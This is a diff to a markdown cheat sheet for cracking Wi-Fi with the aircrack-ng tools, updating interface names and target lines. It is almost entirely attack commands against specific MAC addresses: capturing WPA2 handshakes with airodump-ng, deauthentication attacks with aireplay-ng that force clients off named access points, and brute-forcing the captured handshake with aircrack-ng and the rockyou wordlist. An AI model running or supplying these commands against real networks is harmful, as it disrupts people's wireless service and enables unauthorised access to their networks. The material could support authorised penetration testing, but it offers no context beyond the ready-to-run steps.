@@ -40,30 +40,34 @@ iwconfig
 
 ### Start Scanning for Wi-Fi Networks
 ```bash
-airodump-ng -i wlan0mon
+airodump-ng -i wlan1
 ```
 
 ### Target Specific BSSID and Channel
 ```bash
 airodump-ng --bssid 8E:F5:A3:77:D6:DB -c 3 -- wlan0
-airodump-ng --bssid A8:32:9A:00:CE:96 -c 11 -w /root/Desktop/wpa2 -- wlan0mon
+airodump-ng --bssid A8:32:9A:00:CE:96 -c 11 -w /root/Desktop/wpa2 -- wlan1
 ```
 
 ### Deauthentication Attack (Kick Clients Out)
 ```bash
-aireplay-ng -0 20 -a A8:32:9A:00:CE:96 -c 08:4A:CF:7D:47:14 wlan0mon
+aireplay-ng -0 20 -a A8:32:9A:00:CE:96 -c 08:4A:CF:7D:47:14 wlan1
+aireplay-ng -0 20 -a F8:0C:58:B7:4C:51 wlan1
 ```
 
 ### Brute Force Attack
 ```bash
-aircrack-ng -a2 -b 78:1D:BA:93:1F:9A -w /root/Desktop/rockyou.txt
-aircrack-ng -a2 -b A8:32:9A:00:66:E8 -w /media/root/CAF04BE4F04BD57B/test/word.txt /media/root/CAF04BE4F04BD57B/test/Digicom-01.cap
+aircrack-ng -a2 -b F8:0C:58:B7:4C:51 -w /home/kali/Desktop/rockyou.txt /home/kali/Desktop/wpa2/-01.cap
 ```
 
 ### Stop Monitor Mode
 ```bash
-airmon-ng stop wlan0mon
-service network-manager restart
+airmon-ng stop wlan1
+
+sudo service network-manager restart
+
+sudo systemctl restart NetworkManager
+
 ```
 
 ---
